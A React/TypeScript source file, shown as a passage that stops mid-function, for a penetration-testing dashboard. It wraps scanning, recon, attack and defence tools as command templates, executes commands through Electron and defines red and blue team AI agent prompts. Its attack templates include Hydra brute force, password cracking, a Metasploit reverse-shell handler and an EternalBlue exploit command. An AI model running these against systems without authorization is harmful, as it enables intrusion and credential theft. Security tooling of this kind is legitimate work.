import { useState, useEffect, useRef } from "react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Sword,
  Shield,
  Search,
  Terminal,
  Zap,
  Lock,
  Unlock,
  Eye,
  Network,
  Database,
  Wifi,
  Globe,
  Server,
  Key,
  FileText,
  Activity,
  AlertTriangle,
  CheckCircle,
  Send,
  Loader2,
  Clock,
  Star,
  Trash2,
  Copy,
  Radar
} from "lucide-react";
import { motion } from "framer-motion";
import openClaw from "@/services/openclaw";
import { useToast } from "@/hooks/use-toast";
import { cacheService } from "@/services/cache";
import { analyticsService } from "@/services/analytics";
import { tavilyService } from "@/services/tavily";

interface Tool {
  name: string;
  command: string;
  description: string;
  category: string;
  icon: React.ComponentType<{ className?: string }>;
  requiresTarget?: boolean;
  template: string;
}

interface AgentTool {
  type: string;
  function: {
    name: string;
    description: string;
    parameters: Record<string, unknown>;
  };
}

interface AIMessage {
  role: 'user' | 'assistant' | 'system';
  content: string;
  isStreaming?: boolean;
}

interface CommandHistory {
  id: string;
  command: string;
  output: string;
  timestamp: Date;
  success: boolean;
  executionTime: number;
  isFavorite?: boolean;
}

const attackTools: Tool[] = [
  { name: "Nmap Port Scan", command: "nmap", description: "Network discovery and security auditing", category: "Network", icon: Network, requiresTarget: true, template: "nmap -sV -sC {target}" },
  { name: "Nmap Aggressive Scan", command: "nmap", description: "Aggressive scan with OS detection", category: "Network", icon: Network, requiresTarget: true, template: "nmap -A -T4 {target}" },
  { name: "Nmap Vuln Scan", command: "nmap", description: "Vulnerability detection scripts", category: "Network", icon: AlertTriangle, requiresTarget: true, template: "nmap --script vuln {target}" },
  { name: "SQLMap", command: "sqlmap", description: "SQL injection detection and exploitation", category: "Web", icon: Database, requiresTarget: true, template: "sqlmap -u {target} --batch --crawl=2" },
  { name: "SQLMap Risk 3", command: "sqlmap", description: "Aggressive SQL injection testing", category: "Web", icon: Database, requiresTarget: true, template: "sqlmap -u {target} --level=5 --risk=3 --batch" },
  { name: "Hashcat MD5", command: "hashcat", description: "MD5 password cracking", category: "Password", icon: Key, requiresTarget: false, template: "hashcat -m 0 -a 0 hashes.txt wordlist.txt" },
  { name: "Hashcat SHA256", command: "hashcat", description: "SHA-256 password cracking", category: "Password", icon: Key, requiresTarget: false, template: "hashcat -m 1400 -a 0 hashes.txt wordlist.txt" },
  { name: "Hydra SSH", command: "hydra", description: "SSH brute force", category: "Password", icon: Unlock, requiresTarget: true, template: "hydra -L users.txt -P passwords.txt {target} ssh" },
  { name: "Hydra FTP", command: "hydra", description: "FTP brute force", category: "Password", icon: Unlock, requiresTarget: true, template: "hydra -L users.txt -P passwords.txt {target} ftp" },
  { name: "Metasploit Handler", command: "msfconsole", description: "Reverse shell handler (configure LHOST/LPORT)", category: "Exploit", icon: Zap, requiresTarget: false, template: "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'" },
  { name: "Metasploit EternalBlue", command: "msfconsole", description: "MS17-010 exploit (configure LHOST)", category: "Exploit", icon: Zap, requiresTarget: true, template: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set LHOST <your-ip>; run'" },
  { name: "Burp Suite", command: "burpsuite", description: "Web application security testing (GUI/headless)", category: "Web", icon: Globe, requiresTarget: false, template: "burpsuite --headless --project-file=project.burp" },
  { name: "WPScan", command: "wpscan", description: "WordPress security scanner", category: "Web", icon: Search, requiresTarget: true, template: "wpscan --url {target} --enumerate u,p,t" },
  { name: "John the Ripper", command: "john", description: "Password cracking tool", category: "Password", icon: Key, requiresTarget: false, template: "john --wordlist=wordlist.txt hashes.txt" },
  { name: "BeEF", command: "beef-xss", description: "Browser exploitation framework", category: "Web", icon: Eye, requiresTarget: false, template: "beef-xss -c /etc/beef-xss/config.yaml" },
];

const defenceTools: Tool[] = [
  { name: "Wireshark Capture", command: "tshark", description: "Network protocol analyzer (adjust interface)", category: "Monitor", icon: Activity, requiresTarget: false, template: "tshark -i <interface> -w capture.pcap" },
  { name: "Wireshark HTTP", command: "tshark", description: "Capture HTTP traffic only (adjust interface)", category: "Monitor", icon: Activity, requiresTarget: false, template: "tshark -i <interface> -Y http -w http_traffic.pcap" },
  { name: "TCPDump", command: "tcpdump", description: "Command-line packet analyzer (adjust interface)", category: "Monitor", icon: Network, requiresTarget: false, template: "tcpdump -i <interface> -w capture.pcap" },
  { name: "Snort IDS", command: "snort", description: "Intrusion detection system (configure interface)", category: "IDS", icon: Shield, requiresTarget: false, template: "snort -A console -q -c /etc/snort/snort.conf -i <interface>" },
  { name: "Zeek (Bro)", command: "zeek", description: "Network security monitor (configure interface)", category: "Monitor", icon: Eye, requiresTarget: false, template: "zeek -i <interface> local" },
  { name: "Suricata", command: "suricata", description: "IDS/IPS and network security monitoring (configure interface)", category: "IDS", icon: Shield, requiresTarget: false, template: "suricata -c /etc/suricata/suricata.yaml -i <interface>" },
  { name: "Lynis Audit", command: "lynis", description: "Security auditing tool", category: "Audit", icon: FileText, requiresTarget: false, template: "lynis audit system" },
  { name: "Lynis Pentest", command: "lynis", description: "Penetration testing mode", category: "Audit", icon: FileText, requiresTarget: false, template: "lynis audit system --pentest" },
  { name: "ClamAV Scan", command: "clamscan", description: "Antivirus scanning", category: "AV", icon: Shield, requiresTarget: false, template: "clamscan -r /home --infected --remove" },
  { name: "ClamAV Update", command: "freshclam", description: "Update virus definitions", category: "AV", icon: Database, requiresTarget: false, template: "freshclam" },
  { name: "Fail2Ban Status", command: "fail2ban-client", description: "Check ban status", category: "Protection", icon: Lock, requiresTarget: false, template: "fail2ban-client status sshd" },
  { name: "Fail2Ban Unban", command: "fail2ban-client", description: "Unban IP address", category: "Protection", icon: Unlock, requiresTarget: true, template: "fail2ban-client set sshd unbanip {target}" },
  { name: "AIDE Check", command: "aide", description: "File integrity checker", category: "Integrity", icon: CheckCircle, requiresTarget: false, template: "aide --check" },
  { name: "AIDE Init", command: "aide", description: "Initialize integrity database", category: "Integrity", icon: Database, requiresTarget: false, template: "aide --init" },
  { name: "Chkrootkit", command: "chkrootkit", description: "Rootkit scanner", category: "Security", icon: Search, requiresTarget: false, template: "chkrootkit" },
  { name: "Rkhunter", command: "rkhunter", description: "Rootkit hunter", category: "Security", icon: Shield, requiresTarget: false, template: "rkhunter --check" },
  { name: "OSQuery", command: "osquery", description: "SQL-powered OS analytics (non-interactive)", category: "Monitor", icon: Database, requiresTarget: false, template: "osquery --json \"SELECT * FROM processes;\"" },
  { name: "Auditd", command: "auditctl", description: "Linux audit system", category: "Audit", icon: FileText, requiresTarget: false, template: "auditctl -l" },
];

const scanTools: Tool[] = [
  // Cloud/Internet Scanners
  { name: "Shodan Search", command: "shodan", description: "Search Internet-connected devices", category: "Cloud", icon: Globe, requiresTarget: true, template: "shodan search {target}" },
  { name: "Shodan Host Lookup", command: "shodan", description: "Get detailed host information", category: "Cloud", icon: Server, requiresTarget: true, template: "shodan host {target}" },
  { name: "Shodan Download", command: "shodan", description: "Download search results", category: "Cloud", icon: Database, requiresTarget: true, template: "shodan download --limit 1000 \"{target}\" results.json.gz" },
  { name: "ZoomEye", command: "zoomeye", description: "Cyberspace search engine (requires: pip install zoomeye)", category: "Cloud", icon: Eye, requiresTarget: true, template: "zoomeye search \"{target}\" --num 20" },
  { name: "Censys Search", command: "censys", description: "Internet-wide scanning platform (requires: pip install censys)", category: "Cloud", icon: Search, requiresTarget: true, template: "censys search \"{target}\" --index-type hosts" },

  // Vulnerability Scanners
  { name: "Nuclei", command: "nuclei", description: "Fast vulnerability scanner", category: "Vuln", icon: Zap, requiresTarget: true, template: "nuclei -u {target} -t nuclei-templates/" },
  { name: "Nuclei CVE/Vuln", command: "nuclei", description: "Scan with CVE and vulnerability tags", category: "Vuln", icon: FileText, requiresTarget: true, template: "nuclei -u {target} -tags cve,vuln" },
  { name: "Nuclei Severity High", command: "nuclei", description: "High severity scans only", category: "Vuln", icon: AlertTriangle, requiresTarget: true, template: "nuclei -u {target} -severity high,critical" },
  { name: "Nessus", command: "nessus", description: "Comprehensive vulnerability scanner (GUI/API - use web interface)", category: "Vuln", icon: Search, requiresTarget: false, template: "# Nessus is GUI-based - Access at https://localhost:8834" },
  { name: "OpenVAS", command: "gvm-cli", description: "Open-source vulnerability scanner (requires GVM setup)", category: "Vuln", icon: Shield, requiresTarget: false, template: "# OpenVAS uses GVM - Access web interface at https://127.0.0.1:9392" },

  // Secret/Credential Scanners
  { name: "TruffleHog Git", command: "trufflehog", description: "Find secrets in Git repositories", category: "Secret", icon: Key, requiresTarget: true, template: "trufflehog git {target} --json" },
  { name: "TruffleHog Filesystem", command: "trufflehog", description: "Scan filesystem for secrets", category: "Secret", icon: FileText, requiresTarget: true, template: "trufflehog filesystem {target}" },
  { name: "GitLeaks", command: "gitleaks", description: "Detect hardcoded secrets", category: "Secret", icon: Lock, requiresTarget: true, template: "gitleaks detect --source={target} -v" },
  { name: "GitLeaks Protect", command: "gitleaks", description: "Pre-commit secret scanning", category: "Secret", icon: Shield, requiresTarget: false, template: "gitleaks protect -v" },
  { name: "Detect-Secrets", command: "detect-secrets", description: "Prevent secrets in code", category: "Secret", icon: Eye, requiresTarget: true, template: "detect-secrets scan {target}" },

  // Port/Network Scanners
  { name: "Masscan", command: "masscan", description: "Ultra-fast port scanner", category: "Network", icon: Zap, requiresTarget: true, template: "masscan {target} -p1-65535 --rate=1000" },
  { name: "Masscan Top Ports", command: "masscan", description: "Scan top 1000 ports (fast)", category: "Network", icon: Network, requiresTarget: true, template: "masscan {target} -p0-1000 --rate=10000" },
  { name: "RustScan", command: "rustscan", description: "Modern fast port scanner", category: "Network", icon: Zap, requiresTarget: true, template: "rustscan -a {target}" },
  { name: "RustScan + Nmap", command: "rustscan", description: "RustScan with nmap scripts", category: "Network", icon: Terminal, requiresTarget: true, template: "rustscan -a {target} -- -A" },
  { name: "Angry IP Scanner", command: "ipscan", description: "Fast network scanner (primarily GUI)", category: "Network", icon: Network, requiresTarget: true, template: "ipscan -s {target} -o output.txt" },

  // Web Scanners
  { name: "Nikto", command: "nikto", description: "Web server scanner", category: "Web", icon: Server, requiresTarget: true, template: "nikto -h {target}" },
  { name: "Nikto SSL", command: "nikto", description: "SSL/TLS scanning", category: "Web", icon: Lock, requiresTarget: true, template: "nikto -h {target} -ssl" },
  { name: "WPScan", command: "wpscan", description: "WordPress security scanner", category: "Web", icon: Globe, requiresTarget: true, template: "wpscan --url {target} --enumerate u,p,t" },
  { name: "WPScan Aggressive", command: "wpscan", description: "Aggressive WordPress scan", category: "Web", icon: Zap, requiresTarget: true, template: "wpscan --url {target} --enumerate ap,at,cb,dbe --plugins-detection aggressive" },
  { name: "Wappalyzer", command: "wappalyzer", description: "Technology detection (requires: npm install -g wappalyzer-cli)", category: "Web", icon: Eye, requiresTarget: true, template: "wappalyzer {target} -o json" },
  { name: "WhatWeb", command: "whatweb", description: "Website fingerprinting", category: "Web", icon: Search, requiresTarget: true, template: "whatweb {target} -v" },

  // SSL/TLS Scanners
  { name: "SSLScan", command: "sslscan", description: "SSL/TLS cipher scanner", category: "SSL", icon: Lock, requiresTarget: true, template: "sslscan {target}" },
  { name: "TestSSL", command: "testssl.sh", description: "Comprehensive SSL/TLS testing (script path may vary)", category: "SSL", icon: Shield, requiresTarget: true, template: "./testssl.sh {target}" },
  { name: "SSLyze", command: "sslyze", description: "Fast SSL/TLS scanner", category: "SSL", icon: Zap, requiresTarget: true, template: "sslyze --regular {target}" },

  // Container/Cloud Scanners
  { name: "Trivy Image", command: "trivy", description: "Container image scanner", category: "Container", icon: Database, requiresTarget: true, template: "trivy image {target}" },
  { name: "Trivy Filesystem", command: "trivy", description: "Filesystem vulnerability scan", category: "Container", icon: FileText, requiresTarget: true, template: "trivy fs {target}" },
  { name: "Grype", command: "grype", description: "Container/image scanner", category: "Container", icon: Search, requiresTarget: true, template: "grype {target}" },
  { name: "ScoutSuite AWS", command: "scout-suite", description: "AWS security auditing", category: "Cloud", icon: Globe, requiresTarget: false, template: "scout-suite aws" },
  { name: "Prowler AWS", command: "prowler", description: "AWS security assessment", category: "Cloud", icon: Shield, requiresTarget: false, template: "prowler aws" },

  // DNS/Domain Scanners
  { name: "DNSReaper", command: "dnsreaper", description: "DNS takeover scanner", category: "DNS", icon: AlertTriangle, requiresTarget: true, template: "dnsreaper scan --domain {target}" },
  { name: "Altdns", command: "altdns", description: "Subdomain discovery via permutation (requires wordlist)", category: "DNS", icon: Network, requiresTarget: true, template: "altdns -i subdomains.txt -o output -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -s output.txt" },
];

const reconTools: Tool[] = [
  { name: "Nmap Host Discovery", command: "nmap", description: "Ping sweep for host discovery", category: "Network", icon: Network, requiresTarget: true, template: "nmap -sn {target}/24" },
  { name: "Nmap Fast Scan", command: "nmap", description: "Fast port scan (top 100 ports)", category: "Network", icon: Zap, requiresTarget: true, template: "nmap -F {target}" },
  { name: "Masscan", command: "masscan", description: "Ultra-fast port scanner", category: "Network", icon: Zap, requiresTarget: true, template: "masscan {target} -p1-65535 --rate=1000" },
  { name: "Gobuster Dir", command: "gobuster", description: "Directory/file brute-forcing", category: "Web", icon: Search, requiresTarget: true, template: "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt" },
  { name: "Gobuster DNS", command: "gobuster", description: "DNS subdomain brute-forcing", category: "DNS", icon: Globe, requiresTarget: true, template: "gobuster dns -d {target} -w /usr/share/wordlists/subdomains.txt" },
  { name: "Dirb", command: "dirb", description: "Web content scanner", category: "Web", icon: Search, requiresTarget: true, template: "dirb http://{target} /usr/share/wordlists/dirb/common.txt" },
  { name: "FFuf", command: "ffuf", description: "Fast web fuzzer", category: "Web", icon: Zap, requiresTarget: true, template: "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt" },
  { name: "Nikto", command: "nikto", description: "Web server scanner", category: "Web", icon: Server, requiresTarget: true, template: "nikto -h {target}" },
  { name: "WhatWeb", command: "whatweb", description: "Web technology identifier", category: "Web", icon: Eye, requiresTarget: true, template: "whatweb {target}" },
  { name: "theHarvester All", command: "theHarvester", description: "OSINT gathering tool", category: "OSINT", icon: Eye, requiresTarget: true, template: "theHarvester -d {target} -b all" },
  { name: "theHarvester Google", command: "theHarvester", description: "Google dorking", category: "OSINT", icon: Search, requiresTarget: true, template: "theHarvester -d {target} -b google" },
  { name: "Amass Enum", command: "amass", description: "In-depth DNS enumeration", category: "DNS", icon: Globe, requiresTarget: true, template: "amass enum -d {target}" },
  { name: "Amass Intel", command: "amass", description: "Intelligence collection", category: "OSINT", icon: Eye, requiresTarget: true, template: "amass intel -d {target}" },
  { name: "Sublist3r", command: "sublist3r", description: "Subdomain enumeration", category: "DNS", icon: Network, requiresTarget: true, template: "sublist3r -d {target}" },
  { name: "Subfinder", command: "subfinder", description: "Fast passive subdomain discovery", category: "DNS", icon: Search, requiresTarget: true, template: "subfinder -d {target}" },
  { name: "DNSRecon Standard", command: "dnsrecon", description: "Standard DNS enumeration", category: "DNS", icon: Wifi, requiresTarget: true, template: "dnsrecon -d {target} -t std" },
  { name: "DNSRecon Zone Transfer", command: "dnsrecon", description: "DNS zone transfer", category: "DNS", icon: Database, requiresTarget: true, template: "dnsrecon -d {target} -t axfr" },
  { name: "Fierce", command: "fierce", description: "DNS reconnaissance", category: "DNS", icon: Search, requiresTarget: true, template: "fierce --domain {target}" },
  { name: "Shodan Search", command: "shodan", description: "Internet-connected device search", category: "OSINT", icon: Search, requiresTarget: true, template: "shodan search {target}" },
  { name: "Shodan Host", command: "shodan", description: "Host information lookup", category: "OSINT", icon: Server, requiresTarget: true, template: "shodan host {target}" },
  { name: "Recon-ng", command: "recon-ng", description: "Full-featured reconnaissance framework (requires resource file for automation)", category: "OSINT", icon: Terminal, requiresTarget: false, template: "recon-ng -r /path/to/resource/file" },
  { name: "Metagoofil", command: "metagoofil", description: "Metadata extraction tool", category: "OSINT", icon: FileText, requiresTarget: true, template: "metagoofil -d {target} -t pdf,doc -l 50 -o output -f results.html" },
  { name: "SpiderFoot", command: "spiderfoot", description: "OSINT automation (CLI mode)", category: "OSINT", icon: Eye, requiresTarget: true, template: "spiderfoot -s {target} -m all" },
  { name: "Whois", command: "whois", description: "Domain registration lookup", category: "OSINT", icon: Globe, requiresTarget: true, template: "whois {target}" },
  { name: "Nslookup", command: "nslookup", description: "DNS query tool", category: "DNS", icon: Wifi, requiresTarget: true, template: "nslookup {target}" },
  { name: "Dig", command: "dig", description: "DNS lookup utility", category: "DNS", icon: Network, requiresTarget: true, template: "dig {target} ANY" },
];

/**
 * Get AI agent tools (Tavily search + MCP monitoring)
 */
async function getAgentTools(): Promise<AgentTool[]> {
  const tools: AgentTool[] = [];

  // Add Tavily search tool for web research
  tools.push({
    type: 'function',
    function: {
      name: 'tavily_search',
      description: 'Search the web for cybersecurity information, tools, techniques, CVEs, and best practices. Use when you need current information about security topics.',
      parameters: {
        type: 'object',
        properties: {
          query: {
            type: 'string',
            description: 'Search query (e.g., "Docker security scanning tools", "privilege escalation techniques", "SIEM best practices")'
          },
          search_depth: {
            type: 'string',
            enum: ['basic', 'advanced'],
            description: 'Search depth - use "advanced" for detailed research',
            default: 'advanced'
          },
          max_results: {
            type: 'number',
            description: 'Maximum number of results (default: 5)',
            default: 5
          }
        },
        required: ['query']
      }
    }
  });

  // Get MCP monitoring tools (if available in Electron)
  if (typeof window !== 'undefined' && window.electronAPI) {
    try {
      const response = await window.electronAPI.getMonitoringTools();
      if (response.success && response.tools) {
        tools.push(...response.tools);
      }
    } catch (error) {
      console.error('Failed to get MCP monitoring tools:', error);
    }
  }

  return tools;
}

export default function CyberOps() {
  const { toast } = useToast();
  const chatScrollRef = useRef<HTMLDivElement>(null);
  const [activeTab, setActiveTab] = useState<"scan" | "recon" | "attack" | "defence">("scan");
  const [selectedTool, setSelectedTool] = useState<Tool | null>(null);
  const [target, setTarget] = useState("");
  const [customCommand, setCustomCommand] = useState("");
  const [output, setOutput] = useState("");
  const [isRunning, setIsRunning] = useState(false);
  const [chatMessages, setChatMessages] = useState<AIMessage[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [isStreaming, setIsStreaming] = useState(false);
  const [commandHistory, setCommandHistory] = useState<CommandHistory[]>([]);
  const [showHistory, setShowHistory] = useState(false);
  const [threatIntel, setThreatIntel] = useState<string>("");
  const [isLoadingIntel, setIsLoadingIntel] = useState(false);

  // Auto-scroll chat to bottom when new messages arrive
  useEffect(() => {
    if (chatScrollRef.current) {
      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
    }
  }, [chatMessages]);

  // Clear chat when switching between operation types
  useEffect(() => {
    setChatMessages([]);
  }, [activeTab]);

  const getTools = () => {
    switch (activeTab) {
      case "scan": return scanTools;
      case "recon": return reconTools;
      case "attack": return attackTools;
      case "defence": return defenceTools;
    }
  };

  const getAgentName = () => {
    switch (activeTab) {
      case "scan": return "Scanner Agent";
      case "recon": return "Intel Agent";
      case "attack": return "Red Team Agent";
      case "defence": return "Blue Team Agent";
    }
  };

  const getAgentPrompt = () => {
    switch (activeTab) {
      case "scan": return "I'm your Scanner AI assistant. I help with automated security scanning, vulnerability detection, and compliance checking. Ask me about scanning tools, configurations, or best practices.";
      case "recon": return "I'm your Intelligence AI assistant. I help with reconnaissance, OSINT, and information gathering. Ask me about enumeration techniques, intelligence sources, or recon methodologies.";
      case "attack": return "I'm your Red Team AI assistant. I help with offensive security operations, penetration testing, and vulnerability assessment. Ask me about exploits, attack vectors, or tool usage.";
      case "defence": return "I'm your Blue Team AI assistant. I help with defensive security, monitoring, incident response, and system hardening. Ask me about threat detection, security best practices, or defensive tools.";
    }
  };

  const getSystemPrompt = () => {
    switch (activeTab) {
      case "scan":
        return `You are a Scanner AI Agent, an expert in automated security scanning, vulnerability assessment, and compliance checking using specialized scanning tools.

Your capabilities include:
- Web search for current scanner information and best practices (Tavily)
- Local system monitoring to check for security issues (MCP monitoring tools)

Your expertise includes:
- Cloud scanning platforms (Shodan, ZoomEye, Censys)
- Vulnerability scanners (Nuclei, Nessus, OpenVAS)
- Secret/credential scanners (TruffleHog, GitLeaks, Detect-Secrets)
- Port/network scanners (Masscan, RustScan, Angry IP Scanner)
- Web application scanners (Nikto, WPScan, WhatWeb, Wappalyzer)
- SSL/TLS scanners (SSLScan, TestSSL, SSLyze)
- Container/cloud scanners (Trivy, Grype, ScoutSuite, Prowler)
- DNS/domain scanners (DNSReaper, Altdns)

Guidelines:
- Explain scanner configurations and best practices
- Help choose the right tool for specific scan types
- Interpret scanner results and prioritize findings
- Recommend scan frequency and scheduling
- Explain false positive identification
- Suggest remediation strategies based on scan results
- Emphasize authenticated vs unauthenticated scanning
- Discuss rate limiting and stealth techniques
- Explain compliance scanning (PCI-DSS, HIPAA, SOC2)

Best Practices:
- Always scan with proper authorization
- Use rate limiting to avoid DoS
- Schedule scans during maintenance windows
- Maintain scan result history for trend analysis
- Integrate scanning into CI/CD pipelines
- Combine multiple scanners for comprehensive coverage
- Validate findings before remediation

IMPORTANT: Only provide guidance for authorized security scanning with written permission, bug bounty programs with scope approval, and compliance assessments. Never scan systems without explicit authorization.`;

      case "recon":
        return `You are an Intelligence AI Agent, an expert in reconnaissance, OSINT (Open Source Intelligence), and information gathering.

Your capabilities include:
- Web search for OSINT techniques and intelligence sources (Tavily)
- Local system monitoring for network connections and security posture (MCP monitoring tools)

Your expertise includes:
- Passive and active reconnaissance techniques
- OSINT methodologies and sources
- DNS enumeration and subdomain discovery
- Network mapping and asset discovery
- Web application fingerprinting
- Social media intelligence (SOCMINT)
- Tools: theHarvester, Amass, Sublist3r, Shodan, Gobuster, Nikto

Guidelines:
- Distinguish between passive (stealthy) and active (detectable) recon
- Recommend appropriate OSINT sources and techniques
- Help users understand attack surface mapping
- Provide enumeration strategies for different targets
- Explain how to gather intelligence ethically and legally
- Focus on publicly available information
- Suggest tools for different reconnaissance phases

IMPORTANT: Only provide guidance for authorized reconnaissance, bug bounty programs, security research, and OSINT investigations. Always respect privacy and legal boundaries.`;

      case "attack":
        return `You are a Red Team AI Agent, an expert in offensive security operations, penetration testing, and vulnerability assessment.

Your capabilities include:
- Web search for exploits, attack techniques, and security tools (Tavily)
- Local system monitoring to assess privilege levels and running processes (MCP monitoring tools)

Your expertise includes:
- Penetration testing methodologies (PTES, OWASP, OSSTMM)
- Exploitation techniques and exploit development
- Network and web application security testing
- Password cracking and credential attacks
- Social engineering tactics
- Post-exploitation and privilege escalation
- Tools: Metasploit, Burp Suite, SQLMap, Nmap, Hashcat, Hydra

Guidelines:
- ALWAYS emphasize legal and ethical use (authorized testing only)
- Provide detailed, technical explanations
- Suggest appropriate tools and techniques
- Explain attack vectors and mitigation strategies
- Focus on real-world scenarios and CTF challenges
- Help users understand vulnerabilities from an attacker's perspective

IMPORTANT: Only provide guidance for authorized security testing, penetration testing with written permission, CTF challenges, and educational purposes.`;

      case "defence":
        return `You are a Blue Team AI Agent, an expert in defensive security, threat detection, incident response, and system hardening.

Your capabilities include:
- Web search for threat intelligence, defensive tools, and security best practices (Tavily)
- Local system monitoring for security status, running processes, and anomalies (MCP monitoring tools)

Your expertise includes:
- Security monitoring and SIEM operations
- Intrusion detection and prevention (IDS/IPS)
- Incident response and forensics
- System hardening and security compliance
- Threat hunting and anomaly detection
- Security architecture and defense in depth
- Tools: Wireshark, Snort, Lynis, ClamAV, Fail2Ban, AIDE

Guidelines:
- Focus on proactive defense and detection strategies
- Recommend security best practices and frameworks (NIST, CIS)
- Help configure monitoring and alerting systems
- Provide incident response procedures
- Suggest hardening measures and security baselines
- Explain defensive tactics against known attack patterns
- Emphasize defense in depth and layered security

Your role is to help organizations protect their infrastructure, detect threats, and respond to security incidents effectively.`;
    }
  };

  const selectTool = (tool: Tool) => {
    setSelectedTool(tool);
    setCustomCommand(tool.template.replace("{target}", target || "[target]"));
  };

  const runCommand = async () => {
    if (!customCommand.trim()) return;

    const startTime = Date.now();
    setIsRunning(true);
    setOutput(`Running: ${customCommand}\n\n`);

    try {
      // Check if running in Electron with access to shell commands
      const isElectron = window.electronAPI !== undefined;

      let result: string;
      let success = true;

      if (isElectron) {
        try {
          // Execute command via Electron IPC
          result = await window.electronAPI.executeCommand(customCommand);
          setOutput(prev => prev + result);
        } catch (electronError) {
          console.error('Electron command execution error:', electronError);
          success = false;
          result = `Error executing command: ${electronError instanceof Error ? electronError.message : 'Unknown error'}`;
          setOutput(prev => prev + result);
        }
      } else {
        // Web mode - check cache or show warning
        const cached = await cacheService.get<string>(
          `cmd:${customCommand}`,
          'tool_result',
          { namespace: 'cyberops_commands', userSpecific: true }
        );

        if (cached) {
          result = cached;
          setOutput(prev => prev + `[CACHED RESULT]\n\n${result}`);
          toast({
            title: "Cached Result",
            description: "Showing previously executed command result",
          });
        } else {
          result = `⚠️ Web Mode Limitation\n\nActual command execution requires the Electron desktop app.\n\nCommand: ${customCommand}\n\nTo run this command:\n1. Download the Electron desktop version\n2. Install required security tools (${selectedTool?.command || 'tool'})\n3. Run the command from the desktop app\n\nFor educational purposes, this would typically execute:\n${customCommand}`;
          setOutput(prev => prev + result);
          success = false;
        }
      }

      const executionTime = Date.now() - startTime;

      // Save to command history
      const historyEntry: CommandHistory = {
        id: crypto.randomUUID(),
        command: customCommand,
        output: result,
        timestamp: new Date(),
        success,
        executionTime,
        isFavorite: false,
      };
      setCommandHistory(prev => [historyEntry, ...prev]);

      // Cache the result in Supabase (only successful commands)
      if (success && result) {
        await cacheService.set(
          `cmd:${customCommand}`,
          result,
          'tool_result',
          {
            ttl: 3600 * 24, // 24 hours
            namespace: 'cyberops_commands',
            userSpecific: true,
            metadata: {
              tool: selectedTool?.name || 'custom',
              category: activeTab,
              executionTime,
            },
          }
        );
      }

      // Log activity to Supabase analytics
      await analyticsService.logApiCall({
        service: 'cyberops',
        action: selectedTool?.name || 'custom_command',
        responseTimeMs: executionTime,
        status: success ? 'success' : 'error',
        details: {
          command: customCommand,
          tool: selectedTool?.name,
          category: activeTab,
          target: target || undefined,
        },
      });

      if (success) {
        toast({
          title: "Command Executed",
          description: `Completed in ${executionTime}ms`,
        });
      }

    } catch (error) {
      console.error('Command execution error:', error);
      const errorMsg = `Error: ${error instanceof Error ? error.message : 'Unknown error'}`;
      setOutput(prev => prev + errorMsg);

      toast({
        title: "Execution Failed",
        description: error instanceof Error ? error.message : "Command execution failed",
        variant: "destructive",
      });

      // Log error
      await analyticsService.logApiCall({
        service: 'cyberops',
        action: selectedTool?.name || 'custom_command',
        responseTimeMs: Date.now() - startTime,
        status: 'error',
        details: {
          command: customCommand,
          error: error instanceof Error ? error.message : 'Unknown error',
        },
      });
    } finally {
      setIsRunning(false);
    }
  };

  const toggleHistoryFavorite = (id: string) => {
    setCommandHistory(prev =>
      prev.map(item =>
        item.id === id ? { ...item, isFavorite: !item.isFavorite } : item
      )
    );
  };

  const deleteHistoryItem = (id: string) => {
    setCommandHistory(prev => prev.filter(item => item.id !== id));
    toast({
      title: "Deleted",
      description: "Command removed from history",
    });
  };

  const copyCommand = (command: string) => {
    navigator.clipboard.writeText(command);
    toast({
      title: "Copied",
      description: "Command copied to clipboard",
    });
  };

  const loadHistoryCommand = (item: CommandHistory) => {
    setCustomCommand(item.command);
    setOutput(item.output);
    toast({
      title: "Command Loaded",
      description: "Previous command loaded from history",
    });
  };

  const fetchThreatIntel = async () => {
    if (!target.trim()) {
      toast({
        title: "No Target",
        description: "Please enter a target IP or domain first",
        variant: "destructive",
      });
      return;
    }

    setIsLoadingIntel(true);
    setThreatIntel("");

    try {
      // Detect if target is IP or domain for better search query
      const isIP = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(target);

      // Build context-aware search query
      let query;
      if (isIP) {
        // For IPs, search for general threat intelligence techniques
        query = `cybersecurity threat intelligence methodology IP address reconnaissance network security scanning`;
      } else {
        // For domains, search for specific threat intel
        query = `${target} domain security assessment vulnerability report threat intelligence`;
      }

      const results = await tavilyService.search({
        query,
        search_depth: 'advanced',
        max_results: 5,
        include_answer: true,
      });

      let intelReport = `🔍 THREAT INTELLIGENCE REPORT\nTarget: ${target}\n`;
      intelReport += `Type: ${isIP ? 'IP Address' : 'Domain/Hostname'}\n\n`;

      if (isIP) {
        intelReport += `⚠️ IP Address Detection:\nSearching for IP-specific intelligence requires specialized tools.\n\n`;
        intelReport += `🔧 RECOMMENDED ACTIONS:\n`;
        intelReport += `1. Use Shodan.io to search for open ports and services\n`;
        intelReport += `2. Check AbuseIPDB for abuse reports\n`;
        intelReport += `3. Use VirusTotal for IP reputation\n`;
        intelReport += `4. Run nmap for active reconnaissance\n`;
        intelReport += `5. Check WHOIS for network ownership\n\n`;
      }

      if (results.data.answer) {
        intelReport += `📊 INTELLIGENCE SUMMARY:\n${results.data.answer}\n\n`;
      }

      if (results.data.results && results.data.results.length > 0) {
        intelReport += `📋 THREAT INTELLIGENCE SOURCES:\n\n`;
        results.data.results.forEach((result, idx) => {
          intelReport += `${idx + 1}. ${result.title}\n`;
          intelReport += `   URL: ${result.url}\n`;
          intelReport += `   ${result.content.substring(0, 200)}...\n\n`;
        });
      } else {
        intelReport += `ℹ️ No direct search results found.\n\n`;
        intelReport += `🛠️ MANUAL OSINT RESOURCES:\n`;
        intelReport += `• Shodan: https://www.shodan.io/search?query=${target}\n`;
